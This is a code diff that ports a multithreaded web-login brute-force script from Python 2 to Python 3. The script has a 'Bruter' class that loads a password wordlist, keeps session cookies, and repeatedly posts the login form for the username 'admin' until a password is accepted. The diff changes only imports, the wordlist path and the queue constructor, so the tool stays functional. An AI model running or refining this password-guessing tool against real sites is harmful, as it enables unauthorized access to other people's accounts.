@@ -1,5 +1,6 @@
-#import urllib2
-import urllib
+from urllib.request import build_opener, HTTPCookieProcessor, urlencode
+from urllib.parse import urlencode
+
 import http.cookiejar
 import threading
 import sys
@@ -10,7 +11,7 @@ from html.parser import HTMLParser
 # general settings
 user_thread = 10
 username = "admin"
-wordlist_file = "/tmp/cain.txt"
+wordlist_file = "../../data/brutalforce-database/cain.txt"
 resume = None
 
 # target specific settings
@@ -63,7 +64,7 @@ class Bruter(object):
         while not self.password_q.empty() and not self.found:
             brute = self.password_q.get().rstrip()
             jar = http.cookiejar.FileCookieJar("cookies")
-            opener = urllib.build_opener(urllib.HTTPCookieProcessor(jar))
+            opener = build_opener(HTTPCookieProcessor(jar))
 
             response = opener.open(target_url)
 
@@ -82,7 +83,7 @@ class Bruter(object):
             post_tags[username_field] = self.username
             post_tags[password_field] = brute
 
-            login_data = urllib.urlencode(post_tags)
+            login_data = urlencode(post_tags)
             login_response = opener.open(target_post, login_data)
 
             login_result = login_response.read()
@@ -104,7 +105,7 @@ def build_wordlist(wordlist_file):
     fd.close()
 
     found_resume = False
-    words = Queue.Queue()
+    words = Queue()
 
     for word in raw_words:
 
